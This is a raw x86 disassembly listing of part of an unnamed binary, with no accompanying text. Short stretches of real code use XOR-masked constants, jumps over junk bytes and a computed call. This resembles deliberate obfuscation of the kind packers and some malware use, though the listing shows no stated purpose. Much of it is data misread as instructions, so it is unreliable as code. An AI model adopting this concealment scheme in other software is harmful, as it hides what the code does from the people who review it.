  4021ce:	jmp    0x94ec:0xa7f835f7
  4021d5:	test   al,0x90
  4021d7:	xchg   esi,eax
  4021d8:	jbe    0x402256
  4021da:	jl     0x40217e
  4021dc:	jl     0x40225a
  4021de:	jl     0x402176
  4021e0:	(bad)  
  4021e1:	out    0x18,eax
  4021e3:	(bad)  
  4021e4:	out    0x44,al
  4021e6:	add    ch,BYTE PTR [edi+0x6f8cb906]
  4021ec:	adc    al,0xb
  4021ee:	out    dx,al
  4021ef:	shl    DWORD PTR [esi+eiz*8],0x35
  4021f3:	pop    edi
  4021f4:	enter  0x31f3,0x1c
  4021f8:	push   esi
  4021f9:	pop    es
  4021fa:	leave  
  4021fb:	loop   0x4021ce
  4021fd:	adc    DWORD PTR [ebx],eax
  4021ff:	and    eax,0x4f9bfac8
  402204:	data16 aam 0x66
  402207:	arpl   WORD PTR [edx],bx
  402209:	arpl   sp,ax
  40220b:	dec    ebp
  40220c:	sbb    dh,al
  40220e:	jnp    0x4021ed
  402210:	popa   
  402211:	ja     0x402256
  402213:	dec    ebp
  402214:	aas    
  402215:	stos   DWORD PTR es:[edi],eax
  402216:	pop    ds
  402217:	cmp    al,0x9f
  402219:	nop
  40221a:	ret    
  40221b:	mov    esp,0x26a3e122
  402220:	xchg   edx,eax
  402221:	xor    ebp,DWORD PTR [ecx]
  402223:	rcr    BYTE PTR ds:0x2596147e,0x3c
  40222a:	adc    al,0xb5
  40222c:	inc    esi
  40222d:	inc    edx
  40222e:	call   0x56696254
  402233:	sub    eax,0x6de9b049
  402238:	and    DWORD PTR [edi+0xd13b6e],ebp
  40223e:	pop    ss
  40223f:	fs test al,0x85
  402242:	mov    ebx,edi
  402244:	push   edi
  402245:	out    0x32,al
  402247:	xor    ch,ch
  402249:	scas   eax,DWORD PTR es:[edi]
  40224a:	call   0xb76c:0xfbea4d53
  402251:	jmp    0x45b8:0x4b2fc082
  402258:	jmp    0xb527:0x571658f5
  40225f:	jae    0x4022e0
  402261:	sub    eax,DWORD PTR [eax+ebx*4-0x4fe002ff]
  402268:	push   es
  402269:	push   ebp
  40226a:	ins    BYTE PTR es:[edi],dx
  40226b:	sar    DWORD PTR [edx+0x3a3dc764],cl
  402271:	sub    esi,eax
  402273:	aas    
  402274:	xchg   BYTE PTR [eax],ah
  402276:	dec    edi
  402277:	sbb    eax,DWORD PTR [esi+0x7158979]
  40227d:	sub    bh,dl
  40227f:	fbld   TBYTE PTR [eax-0x574e524]
  402285:	inc    DWORD PTR [ecx+0x587f9e55]
  40228b:	pop    ds
  40228c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40228d:	retf   0x5c9d
  402290:	cmp    DWORD PTR [ebx+0xf],eax
  402293:	enter  0x8915,0x45
  402297:	or     al,0x8b
  402299:	inc    ebp
  40229a:	cld    
  40229b:	mov    ecx,DWORD PTR [ebp-0x8]
  40229e:	jmp    0x402371
  4022a3:	xchg   ebx,eax
  4022a4:	sub    al,BYTE PTR [esp+eax*1]
  4022a7:	cdq    
  4022a8:	cmp    dl,BYTE PTR [ebx+0x426f4fbd]
  4022ae:	mov    dh,0x6f
  4022b0:	cmp    DWORD PTR [edx+0x13],ecx
  4022b3:	fmul   QWORD PTR [ecx]
  4022b5:	jl     0x402333
  4022b7:	mov    ds:0x1a7c7c7c,al
  4022bc:	sbb    al,0x81
  4022be:	jmp    FWORD PTR [esp+ebp*1-0x3e7da2fb]
  4022c5:	or     esi,DWORD PTR [ebx-0x5f56e586]
  4022cb:	rcl    ah,0xda
  4022ce:	(bad)  
  4022d0:	pop    esp
  4022d1:	out    0x36,eax
  4022d3:	icebp  
  4022d4:	shl    BYTE PTR [ebx],0x14
  4022d7:	add    al,0x2b
  4022d9:	aad    0x1b
  4022db:	mov    ebx,0xda79eae
  4022e0:	dec    esp
  4022e1:	xor    al,0x6c
  4022e3:	or     eax,0x83f92567
  4022e8:	aas    
  4022e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4022ea:	and    DWORD PTR [ecx-0x31de3d27],ecx
  4022f0:	xchg   esp,eax
  4022f1:	js     0x402361
  4022f3:	jp     0x40230d
  4022f5:	outs   dx,BYTE PTR ds:[esi]
  4022f6:	loopne 0x4022a8
  4022f8:	fnstcw WORD PTR [ebx]
  4022fa:	iret   
  4022fb:	jecxz  0x402344
  4022fd:	sbb    BYTE PTR [eax],0x58
  402300:	rol    BYTE PTR [esi],cl
  402302:	jb     0x40234f
  402304:	xor    BYTE PTR [edi+0x454fecd3],0x74
  40230b:	sbb    eax,0xbec7448c
  402310:	xor    cl,al
  402312:	mov    WORD PTR [ecx+0xe71db7e],ss
  402318:	(bad)  
  402319:	jecxz  0x402322
  40231b:	hlt    
  40231c:	fucom  st(2)
  40231e:	cmp    al,0xe0
  402320:	nop
  402321:	(bad)
  402324:	mov    WORD PTR [esi],ss
  402326:	xor    eax,0x35bcd7eb
  40232b:	jg     0x402350
  40232d:	imul   edx,DWORD PTR [ecx+0x19d83d34],0x31fe4f16
  402337:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402338:	xor    DWORD PTR ds:0x7d6a00da,0x58e199f6
  402342:	or     esp,DWORD PTR [eax-0x2e1c44e9]
  402348:	icebp  
  402349:	data16 xor BYTE PTR [edi],ch
  40234c:	mov    bl,0x58
  40234e:	dec    eax
  40234f:	jecxz  0x402383
  402351:	sti    
  402352:	scas   al,BYTE PTR es:[edi]
  402353:	adc    dh,ch
  402355:	ret    0x715e
  402358:	add    DWORD PTR [ecx+0xf],esi
  40235b:	sub    ebx,DWORD PTR [ecx-0x14]
  40235e:	test   BYTE PTR [eax-0x7a],0x93
  402362:	mov    WORD PTR [edx*8-0x7ac5b02a],cs
  402369:	fimul  WORD PTR [edx]
  40236b:	out    dx,eax
  40236c:	aad    0x50
  40236e:	sbb    bh,ah
  402370:	inc    ebx
  402371:	xor    eax,0x7510857
  402376:	add    eax,ebx
  402378:	cmp    ecx,eax
  40237a:	jne    0x40238d
  402380:	mov    eax,DWORD PTR [ebp-0x4]
  402383:	xor    eax,0x7510857
  402388:	jmp    0x4021ae
  40238d:	mov    eax,DWORD PTR [ebp+0xc]
  402390:	add    eax,DWORD PTR [ebp+0x8]
  402393:	mov    DWORD PTR [ebp-0x10],eax
  402396:	mov    eax,DWORD PTR [ebp-0x1c]
  402399:	test   eax,eax
  40239b:	je     0x4026e4
  4023a1:	mov    DWORD PTR [ebp-0x24],esi
  4023a4:	push   0xb
  4023a6:	pop    ecx
  4023a7:	push   0x5
  4023a9:	dec    ecx
  4023aa:	pop    ebx
  4023ab:	xchg   ebx,ecx
  4023ad:	sub    ebx,ecx
  4023af:	xchg   ebx,ecx
  4023b1:	dec    ecx
  4023b2:	mov    eax,DWORD PTR [ebp-0x1c]
  4023b5:	imul   eax,ecx
  4023b8:	sub    esp,eax
  4023ba:	mov    DWORD PTR [ebp-0x24],esp
  4023bd:	mov    eax,DWORD PTR [ebp-0x4]
  4023c0:	mov    ecx,0x7510857
  4023c5:	xor    eax,ecx
  4023c7:	mov    edx,0x32729e
  4023cc:	add    eax,edx
  4023ce:	mov    DWORD PTR [ebp+0x8],eax
  4023d1:	jmp    0x4024a4
  4023d6:	cmp    dl,BYTE PTR [esi+0x7b653be5]
  4023dc:	cli    
  4023dd:	test   eax,0x3babd173
  4023e2:	dec    ebp
  4023e3:	popa   
  4023e4:	nop
  4023e5:	push   edi
  4023e6:	add    cl,BYTE PTR [eax]
  4023e8:	jl     0x402466
  4023ea:	mov    ds:0xd77c7c7c,al
  4023ef:	je     0x40242e
  4023f1:	jge    0x4023d7
  4023f3:	or     DWORD PTR [edi+0x7e],0xffffffc9
  4023f7:	fsubr  DWORD PTR [edx]
  4023f9:	push   cs
  4023fa:	mov    al,ds:0xd2371c74
  4023ff:	xchg   BYTE PTR [edx+0xc],dl
  402402:	pusha  
  402403:	stc    
  402404:	jae    0x4023a8
  402406:	and    BYTE PTR [ebx],dl
  402408:	pop    eax
  402409:	pop    esp
  40240a:	loop   0x402479
  40240c:	sahf   
  40240d:	pop    edx
  40240e:	into   
  40240f:	dec    ecx
  402410:	cmp    ecx,0x14b51699
  402416:	jmp    0x9ebf:0xc94ab3c9
  40241d:	fistp  WORD PTR [edx]
  40241f:	xor    bl,BYTE PTR [ebx-0x389bc177]
  402425:	xchg   esi,eax
  402426:	jge    0x4023da
  402428:	aam    0x91
  40242a:	push   ebx
  40242b:	dec    ebp
  40242c:	inc    esi
  40242d:	inc    edi
  40242e:	neg    DWORD PTR [ecx+ebp*8+0x1d]
  402432:	pop    ecx
  402433:	push   ecx
  402434:	xor    eax,0x9e36f106
  402439:	add    BYTE PTR [esi-0x241b4a49],dl
  40243f:	dec    esp
  402440:	xchg   BYTE PTR [ecx+0x62fa8526],dl
  402446:	or     al,0xc2
  402448:	call   0xfa37967e
  40244d:	xchg   ecx,eax
  40244e:	jge    0x402472
  402450:	mov    esp,DWORD PTR [esi-0x56]
  402453:	in     eax,dx
  402454:	neg    DWORD PTR [ebp-0x6c]
  402457:	mov    ds:0xa0f287cd,al
  40245c:	enter  0xe89b,0xfb
  402460:	mov    ah,cl
  402462:	jg     0x4024ce
  402464:	lock adc eax,0x3ed0d0f9
  40246a:	call   0x9119e0e0
  40246f:	scas   eax,DWORD PTR es:[edi]
  402470:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402471:	sub    al,0xbd
  402473:	imul   ebx,esp,0x2e1ad6da
  402479:	les    esp,FWORD PTR [ebx+0x75]
  40247c:	test   eax,0x6be679dc
  402481:	int3   
  402482:	sub    eax,esi
  402484:	sub    eax,0xf2bdec4d
  402489:	call   0xc86e567
  40248e:	jb     0x4024e6
  402490:	js     0x40249a
  402492:	ret    
  402493:	dec    dl
  402495:	and    DWORD PTR [ebp+0x32],esi
  402498:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402499:	popa   
  40249a:	inc    esi
  40249b:	adc    al,0x12
  40249d:	mov    bl,0xd2
  40249f:	fmul   st,st(6)
  4024a1:	ret    0x7ff3
  4024a4:	mov    eax,DWORD PTR [ebp-0x18]
  4024a7:	xor    eax,ecx
  4024a9:	add    eax,edx
  4024ab:	mov    edx,DWORD PTR [ebp+0x14]
  4024ae:	jmp    0x402581
  4024b3:	and    al,0x81
  4024b5:	rep ins BYTE PTR es:[edi],dx
  4024b7:	lods   eax,DWORD PTR ds:[esi]
  4024b8:	(bad)  
  4024b9:	sti    
  4024ba:	pop    ecx
  4024bb:	xor    DWORD PTR [ebx],0x5f3ebfae
  4024c1:	sbb    esi,eax
  4024c3:	dec    eax
  4024c4:	or     BYTE PTR [esp+edi*2-0x5e],bh
  4024c8:	jl     0x402546
  4024ca:	jl     0x402451
  4024cc:	xor    edi,DWORD PTR [ebx-0x2a]
  4024cf:	(bad)  
  4024d0:	dec    eax
  4024d1:	ins    DWORD PTR es:[edi],dx
  4024d2:	nop
  4024d3:	push   ss
  4024d4:	sub    esi,DWORD PTR [esi+0x59f168d1]
  4024da:	jnp    0x402512
  4024dc:	ret    
  4024dd:	ficom  DWORD PTR [esi+0x3b]
  4024e0:	add    DWORD PTR [eax-0x42],esp
  4024e3:	imul   ebx,DWORD PTR [esi+0x639cb774],0x26723d47
  4024ed:	shl    BYTE PTR [eax+0x3c],cl
  4024f0:	out    dx,al
  4024f1:	dec    esp
  4024f2:	iret   
  4024f3:	imul   esp,DWORD PTR [edi],0x19
  4024f6:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4024f8:	pop    edx
  4024f9:	push   ds
  4024fa:	dec    eax
  4024fb:	lods   eax,DWORD PTR ds:[esi]
  4024fc:	push   edi
  4024fd:	sbb    al,0x2d
  4024ff:	out    dx,al
  402500:	sub    DWORD PTR [ebx+0x2df78a68],eax
  402506:	scas   eax,DWORD PTR es:[edi]
  402507:	inc    edi
  402508:	mov    ah,0xf2
  40250a:	lea    edi,ss:[esi+0xb]
  40250e:	adc    DWORD PTR [ecx-0x5225939b],ecx
  402514:	adc    BYTE PTR [eax+0xe],bh
  402517:	hlt    
  402518:	push   cs
  402519:	fcomp  st(2)
  40251b:	scas   al,BYTE PTR es:[edi]
  40251c:	mov    ds:0x23549f0,al
  402521:	nop
  402522:	xchg   esp,eax
  402523:	fld    QWORD PTR [esi+0x56]
  402526:	and    DWORD PTR [edi+0x1e5be6e9],ebp
  40252c:	jmp    0x402598
  40252e:	adc    BYTE PTR [ebx-0x1c],dh
  402531:	je     0x402596
  402533:	icebp  
  402534:	lds    edi,FWORD PTR [ebp+eiz*1+0x3b]
  402538:	sub    BYTE PTR [edx-0x7cb7b090],bl
  40253e:	retf   
  40253f:	pop    ss
  402540:	aam    0x35
  402542:	jg     0x402561
  402544:	in     al,dx
  402545:	stos   BYTE PTR es:[edi],al
  402546:	inc    eax
  402547:	sbb    DWORD PTR [ebx-0x603bdf43],ebp
  40254d:	xchg   ah,bl
  40254f:	jmp    0xa549:0x9366568b
  402556:	ins    DWORD PTR es:[edi],dx
  402557:	sti    
  402558:	push   es
  402559:	cdq    
  40255a:	push   eax
  40255b:	mov    WORD PTR ds:0x1ca82310,es
  402561:	cmp    BYTE PTR [ecx],0xf5
  402564:	imul   ebp,DWORD PTR [ebx-0x17],0xffffffde
  402568:	adc    ah,0x1e
  40256b:	xor    al,0x46
  40256d:	mov    ecx,ebx
  40256f:	add    eax,0xe3179ae1
  402574:	xor    DWORD PTR [edx+0x22],esi
  402577:	in     eax,dx
  402578:	cmp    bh,BYTE PTR [edx+0x76]
  40257b:	dec    edi
  40257c:	pusha  
  40257d:	pop    esi
  40257e:	lds    esp,FWORD PTR [edi]
  402580:	inc    ebp
  402581:	imul   eax,DWORD PTR [edx]
  402584:	mov    edx,DWORD PTR [ebp-0x4]
  402587:	xor    edx,ecx
  402589:	mov    ecx,DWORD PTR [ebp+0x8]
  40258c:	lea    ecx,[edx+ecx*1+0x32729e]
  402593:	cmp    ecx,eax
  402595:	je     0x4026df
  40259b:	mov    edi,DWORD PTR [ebp-0x18]
  40259e:	mov    eax,DWORD PTR [ebp+0x8]
  4025a1:	mov    edx,DWORD PTR [ebp+0x14]
  4025a4:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  4025a8:	mov    ecx,0x7510857
  4025ad:	xor    edx,edx
  4025af:	xor    edi,ecx
  4025b1:	mov    esi,0x32729e
  4025b6:	add    edi,esi
  4025b8:	div    edi
  4025ba:	mov    edx,DWORD PTR [ebp-0x4]
  4025bd:	xor    edx,ecx
  4025bf:	lea    eax,[edx+eax*1+0x32729e]
  4025c6:	mov    edx,DWORD PTR [ebp+0x8]
  4025c9:	mov    edi,DWORD PTR [ebp-0x24]
  4025cc:	mov    DWORD PTR [edi+edx*4],eax
  4025cf:	mov    eax,DWORD PTR [ebp-0x18]
  4025d2:	mov    edx,DWORD PTR [ebp+0x8]
  4025d5:	xor    eax,ecx
  4025d7:	lea    eax,[eax+edx*1+0x32729e]
  4025de:	mov    DWORD PTR [ebp+0x8],eax
  4025e1:	mov    eax,DWORD PTR [ebp-0x18]
  4025e4:	mov    edx,DWORD PTR [ebp+0x14]
  4025e7:	xor    eax,ecx
  4025e9:	add    eax,esi
  4025eb:	imul   eax,DWORD PTR [edx]
  4025ee:	mov    edx,DWORD PTR [ebp-0x4]
  4025f1:	xor    edx,ecx
  4025f3:	mov    ecx,DWORD PTR [ebp+0x8]
  4025f6:	lea    ecx,[edx+ecx*1+0x32729e]
  4025fd:	cmp    ecx,eax
  4025ff:	jne    0x40259b
  402605:	jmp    0x4026d8
  40260a:	xlat   BYTE PTR ds:[ebx]
  40260b:	pop    esp
  40260c:	cmp    DWORD PTR [eax-0x47],eax
  40260f:	pop    ebp
  402610:	ins    DWORD PTR es:[edi],dx
  402611:	jnp    0x4025e8
  402613:	sbb    ch,bl
  402615:	mov    DWORD PTR [ebp-0x35],esi
  402618:	imul   ebx,DWORD PTR [edi+0x7c7c0bfe],0x7c7c7ca2
  402622:	xchg   ah,bh
  402624:	adc    al,0x2e
  402626:	inc    ecx
  402627:	inc    esp
  402628:	ret    0x43ea
  40262b:	div    BYTE PTR [edi-0x10e0b892]
  402631:	cmp    edx,0xbd7d7b89
  402637:	cmp    al,0xf5
  402639:	popf   
  40263a:	push   cs
  40263b:	test   DWORD PTR [ebp+0x79df8e52],0x875330ab
  402645:	(bad)  
  402646:	cli    
  402647:	jmp    0x40264d
  402649:	clc    
  40264a:	arpl   WORD PTR ds:0x8cd1f9b9,di
  402650:	pop    ss
  402651:	pop    es
  402652:	mov    dh,ch
  402654:	mov    edi,ebx
  402656:	mov    al,0xba
  402658:	xor    BYTE PTR [esi+0x7bac3687],bh
  40265e:	and    bh,BYTE PTR [edx+0x43]
  402661:	and    DWORD PTR [edx+0x5e],0xffffff9c
  402665:	mov    ah,0x3f
  402667:	jo     0x4026bc
  402669:	sbb    BYTE PTR [ebx],0xdc
  40266c:	mov    ebx,0xf695998b
  402671:	push   ss
  402672:	mov    cl,0x97
  402674:	loope  0x402625
  402676:	cwde   
  402677:	nop
  402678:	sbb    DWORD PTR [esi-0x6d59b208],ecx
  40267e:	aas    
  40267f:	ficom  WORD PTR [ebx]
  402681:	mov    ch,BYTE PTR [eax-0x4dcdbad9]
  402687:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402688:	xor    DWORD PTR [ebp-0x44],ebp
  40268b:	sbb    DWORD PTR [esi],eax
  40268d:	dec    esp
  40268e:	cs stc 
  402690:	mov    esp,0x76a3ad9d
  402695:	into   
  402696:	and    DWORD PTR [esi+0x20],ebx
  402699:	pop    edi
  40269a:	or     DWORD PTR [eax-0x6a],ecx
  40269d:	out    dx,al
  40269e:	lea    edi,[edx]
  4026a0:	ret    
  4026a1:	ja     0x40269e
  4026a3:	lahf   
  4026a4:	shl    DWORD PTR [eax+0x10ece742],1
  4026aa:	nop
  4026ab:	cwde   
  4026ac:	jmp    0x6a19:0xe364f55
  4026b3:	mov    WORD PTR [ebx],ss
  4026b5:	cld    
  4026b6:	outs   dx,DWORD PTR ds:[esi]
  4026b7:	xor    eax,0xd1741838
  4026bc:	cmp    al,0xd9
  4026be:	retf   
  4026bf:	push   0xffffff87
  4026c1:	sub    DWORD PTR [edx-0x67],esp
  4026c4:	mov    bl,BYTE PTR [ebx+0x1c17a8e1]
  4026ca:	mov    esp,0xb037b7d6
  4026cf:	cmp    eax,0x7a4d3a08
  4026d4:	push   0x8b677fa0
  4026d9:	fsubp  st(1),st
  4026db:	add    eax,0xbb000000
  4026e0:	sahf   
  4026e1:	jb     0x402715
  4026e3:	add    BYTE PTR [ebx+0x5735fc45],cl
  4026e9:	or     BYTE PTR [ecx+0x7],dl
  4026ec:	jmp    0x4027bf
  4026f1:	(bad)  
  4026f2:	fsubr  st(2),st
  4026f4:	mov    esp,0x647a42fa
  4026f9:	clc    
  4026fa:	(bad)  
  4026fb:	mov    WORD PTR [ecx-0x69],?
  4026fe:	repz pusha 
  402700:	mov    dh,0x24
  402702:	or     bh,BYTE PTR [esp+edi*2-0x5e]
  402706:	jl     0x402784
  402708:	jl     0x402780
  40270a:	dec    eax
  40270b:	out    0x7e,al
  40270d:	mov    WORD PTR ds:0xe041965f,ss
  402713:	test   al,0xc6
  402715:	retf   0x6535
  402718:	cdq    
  402719:	lds    esi,FWORD PTR [ebx]
  40271b:	imul   ebx,DWORD PTR [ecx-0x60f917f4],0xd77c59f2
  402725:	mov    ebp,0xd403fcdc
  40272a:	jno    0x402726
  40272c:	aaa    
  40272d:	sbb    eax,0x865c347d
  402732:	data16 mov ds:0xa07dc241,al
  402738:	call   0xfd01f138
  40273d:	jno    0x40271d
  40273f:	and    BYTE PTR [edx+0x3b3f62d0],al
  402745:	jle    0x402769
  402747:	xor    ch,0xd7
  40274a:	adc    ch,0x3c
  40274d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40274e:	repnz cmp al,0xce
  402751:	xchg   ecx,eax
  402752:	xchg   ebx,eax
  402753:	icebp  
  402754:	xor    dl,al
  402756:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402757:	add    eax,eax
  402759:	stos   DWORD PTR es:[edi],eax
  40275a:	jo     0x402786
  40275c:	jnp    0x4027d2
  40275e:	sub    al,0xd7
  402760:	lds    eax,FWORD PTR [esi+0x13241a91]
  402766:	cmp    ah,BYTE PTR [esi]
  402768:	xchg   edx,eax
  402769:	leave  
  40276a:	and    ch,BYTE PTR [esi-0x69]
  40276d:	mov    bh,BYTE PTR [edi-0x2c]
  402770:	xchg   ebx,eax
  402771:	popf   
  402772:	xor    ebp,edx
  402774:	and    ecx,ebp
  402776:	ds sub eax,0x16c915d2
  40277c:	stc    
  40277d:	sbb    al,0x55
  40277f:	jmp    0xb396546
  402784:	adc    edx,edx
  402786:	jnp    0x40272b
  402788:	push   edi
  402789:	mov    esi,0x3828d3b6
  40278e:	hlt    
  40278f:	shl    cl,0x85
  402792:	cwde   
  402793:	test   edx,edi
  402795:	and    BYTE PTR [edx-0x3a],bl
  402798:	in     al,dx
  402799:	inc    ecx
  40279a:	mov    esp,0x9b906d58
  40279f:	mov    DWORD PTR [eax+ebx*8-0x74b8ce51],ebp
  4027a6:	push   edx
  4027a7:	rcl    BYTE PTR [edi],cl
  4027a9:	fld1   
  4027ab:	(bad)  
  4027ac:	pusha  
  4027ad:	dec    DWORD PTR [edi-0x78]
  4027b0:	ret    
  4027b1:	xchg   ebp,eax
  4027b2:	dec    edi
  4027b3:	outs   dx,DWORD PTR ds:[esi]
  4027b4:	and    eax,0xe960c40d
  4027b9:	mov    ds,WORD PTR [ecx+0x5b]
  4027bc:	std    
  4027bd:	pop    edx
  4027be:	(bad)  
  4027bf:	add    eax,ebx
  4027c1:	mov    DWORD PTR [ebp-0xc],eax
  4027c4:	jmp    0x402897
  4027c9:	pop    ebp
  4027ca:	fimul  WORD PTR [ebp+eiz*8+0x567d65bb]
  4027d1:	cdq    
  4027d2:	push   es
  4027d3:	mov    si,0xc53e
  4027d7:	jmp    0x7c4a926b
  4027dc:	jl     0x402780
  4027de:	jl     0x40285c
  4027e0:	jl     0x4027c3
  4027e2:	popf   
  4027e3:	fimul  WORD PTR [ebx+0x27]
  4027e6:	inc    ecx
  4027e7:	cmp    BYTE PTR [eax+esi*8],bh
  4027ea:	loope  0x402848
  4027ec:	sbb    dl,BYTE PTR [ebx-0xcdc982d]
  4027f2:	and    eax,0xdd62c2a
  4027f7:	ins    DWORD PTR es:[edi],dx
  4027f8:	pop    edx
  4027f9:	leave  
  4027fa:	mov    al,ds:0x28f8a548
  4027ff:	jbe    0x4027aa
  402801:	popa   
  402802:	cmc    
  402803:	jne    0x4027ab
  402805:	fcmovnu st,st(0)
  402807:	stos   BYTE PTR es:[edi],al
  402808:	push   0xc13deeb5
  40280d:	xchg   BYTE PTR [edi+edx*2+0x3b],dh
  402811:	rol    DWORD PTR [esi+0x362021ce],0xd8
  402818:	adc    al,bl
  40281a:	fisttp QWORD PTR [ebp-0xc]
  40281d:	inc    edi
  40281e:	out    0xb4,eax
  402820:	shr    esi,0x80
  402823:	stc    
  402824:	sti    
  402825:	rcl    BYTE PTR ds:0x7adb8d0a,0xbc
  40282c:	leave  
  40282d:	int    0x8e
  40282f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402830:	add    edx,DWORD PTR [esp+eiz*4+0x17]
  402834:	dec    esi
  402835:	out    dx,eax
  402836:	push   ebp
  402837:	hlt    
  402838:	scas   eax,DWORD PTR es:[edi]
  402839:	test   BYTE PTR [eax],ch
  40283b:	cmc    
  40283c:	inc    ecx
  40283d:	xchg   esp,eax
  40283e:	in     eax,0xfa
  402840:	add    al,0xee
  402842:	dec    ebp
  402843:	fst    st(7)
  402845:	std    
  402846:	push   esi
  402847:	dec    esp
  402848:	ss sbb al,dl
  40284b:	pop    ebp
  40284c:	ins    DWORD PTR es:[edi],dx
  40284d:	dec    ebx
  40284e:	or     BYTE PTR [edx+ecx*1+0x4d0916ac],bh
  402855:	jg     0x402824
  402857:	enter  0xec20,0x5c
  40285b:	xor    ah,BYTE PTR [ebx+0x55]
  40285e:	jb     0x4028cc
  402860:	push   esp
  402861:	lods   eax,DWORD PTR ds:[esi]
  402862:	jecxz  0x40281d
  402864:	fstp   DWORD PTR [edi]
  402866:	push   0xd4b2d457
  40286b:	scas   al,BYTE PTR es:[edi]
  40286c:	sub    cl,BYTE PTR [ecx-0x2e7b3297]
  402872:	(bad)  [edx-0x2560ccdb]
  402878:	repnz aad 0xd6
  40287b:	hlt    
  40287c:	cmp    esi,DWORD PTR [esi-0x71bfa67d]
  402882:	fldl2t 
  402884:	icebp  
  402885:	pop    ebx
  402886:	repz pop edi
  402888:	jo     0x4028b0
  40288a:	mov    DWORD PTR [ebp-0x1fcc745d],ecx
  402890:	ss ins BYTE PTR es:[edi],dx
  402892:	pop    ds
  402893:	pop    ss
  402894:	imul   eax,DWORD PTR [edx],0xffffffad
  402897:	xor    ebx,ebx
  402899:	lea    eax,[ebp-0x10]
  40289c:	add    ebx,DWORD PTR [eax]
  40289e:	call   ebx
  4028a0:	xor    ebx,ebx
  4028a2:	inc    ebx
  4028a3:	cmp    DWORD PTR [ebp+0x10],ebx
  4028a6:	jmp    0x402979
  4028ab:	jmp    0x4028ef
  4028ad:	inc    esp
  4028ae:	ins    BYTE PTR es:[edi],dx
  4028af:	jns    0x40292b
  4028b1:	jmp    0x402910
  4028b3:	loope  0x40292e
  4028b5:	pushf  
  4028b6:	adc    BYTE PTR [ecx+eiz*1-0x63],0x3d
  4028bb:	nop
  4028bc:	or     eax,0x7ca27c7c
  4028c1:	jl     0x40293f
  4028c3:	stc    
  4028c4:	push   esi
  4028c5:	(bad)  
  4028c6:	sbb    BYTE PTR [eax-0x25],dh
  4028c9:	push   esi
  4028ca:	mov    ds:0x40c9aaec,eax
  4028cf:	std    
  4028d0:	sahf   
  4028d1:	mov    ch,0xd7
  4028d3:	lods   eax,DWORD PTR ds:[esi]
  4028d4:	pop    esp
  4028d5:	fisub  WORD PTR [ecx-0x72]
  4028d8:	mov    al,ds:0xad5975ea
  4028dd:	sub    ah,bh
  4028df:	das    
  4028e0:	adc    eax,0x7a3c33b6
  4028e5:	and    bl,BYTE PTR ss:[ebx]
  4028e8:	hlt    
  4028e9:	xor    ecx,DWORD PTR [edi-0x44]
  4028ec:	cmp    al,0x4c
  4028ee:	pushf  
  4028ef:	push   ebp
  4028f0:	out    0xd4,al
  4028f2:	and    ah,ah
  4028f4:	stos   DWORD PTR es:[edi],eax
  4028f5:	jnp    0x402878
  4028f7:	or     al,0x6
  4028f9:	inc    ebp
  4028fa:	fs push edx
  4028fc:	pop    edi
  4028fd:	mov    ecx,0xe9cdb153
  402902:	ret    0xcc2e
  402905:	adc    ebp,edi
  402907:	mov    al,ds:0x217bbe66
  40290c:	fldpi  
  40290e:	push   ebx
  40290f:	ret    
  402910:	cli    
  402911:	adc    eax,0xfb81db1e
  402916:	add    BYTE PTR [ecx-0xc],dh
  402919:	pusha  
  40291a:	pushf  
  40291b:	dec    eax
  40291c:	nop
  40291d:	inc    edx
  40291e:	jns    0x4028df
  402920:	sbb    BYTE PTR [esi+ebp*8],dh
  402923:	xchg   ecx,eax
  402924:	mov    edx,0x94df167c
  402929:	rcl    BYTE PTR es:[edi+0x61],0xd1
  40292e:	sti    
  40292f:	mov    ebx,0x403db32f
  402934:	sbb    al,0xe2
  402936:	sti    
  402937:	xchg   ecx,eax
  402938:	das    
  402939:	aaa    
  40293a:	out    dx,eax
  40293b:	les    ecx,FWORD PTR [ecx-0x2f]
  40293e:	call   FWORD PTR [eax]
  402940:	xchg   esp,eax
  402941:	stos   DWORD PTR es:[edi],eax
  402942:	in     eax,0x64
  402944:	(bad)  
  402945:	test   DWORD PTR [ebx+0x7a2f23ab],0x80965678
  40294f:	bound  edi,QWORD PTR [esi-0x22]
  402952:	mov    esp,0x99806b8d
  402957:	mov    eax,ds:0xf00c2152
  40295c:	clc    
  40295d:	add    al,0xf
  40295f:	lock (bad) 
  402961:	arpl   WORD PTR [edi-0x2e],di
  402964:	jno    0x402973
  402966:	fistp  QWORD PTR [edx+eiz*1-0x78]
  40296a:	jno    0x40295a
  40296c:	stos   BYTE PTR es:[edi],al
  40296d:	add    ch,dl
  40296f:	cmp    bh,BYTE PTR [edi-0x75]
  402972:	fisubr WORD PTR [ebp-0xb21781a]
  402978:	pusha  
  402979:	je     0x402997
  40297f:	xchg   edx,eax
  402980:	push   0xa
  402982:	pop    ecx
  402983:	push   0x4
  402985:	pop    ebx
  402986:	inc    ebx
  402987:	xchg   ebx,ecx
  402989:	sub    ebx,ecx
  40298b:	xchg   ebx,ecx
  40298d:	dec    ecx
  40298e:	mov    eax,DWORD PTR [ebp-0x1c]
  402991:	imul   eax,ecx
  402994:	add    esp,eax
  402996:	xchg   edx,eax
  402997:	push   eax
  402998:	xor    ebx,ebx
  40299a:	mov    edx,esp
  40299c:	jmp    0x402a6f
  4029a1:	jns    0x4029c0
  4029a3:	inc    ebp
  4029a4:	ds gs mov dh,0x7d
  4029a8:	mov    ebp,0x6beb4b4b
  4029ad:	pop    ebx
  4029ae:	sbb    cl,dh
  4029b0:	mov    ds:0x7c7c0cc6,eax
  4029b5:	mov    ds:0x7e7c7c7c,al
  4029ba:	loopne 0x4029c4
  4029bc:	push   ecx
  4029bd:	test   DWORD PTR [ebx],0x13c306e8
  4029c3:	push   0x75
  4029c5:	pop    ds
  4029c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4029c7:	in     eax,0xb6
  4029c9:	mov    al,ds:0x48d2943a
  4029ce:	sbb    dh,BYTE PTR [esi+0x2a56c4e3]
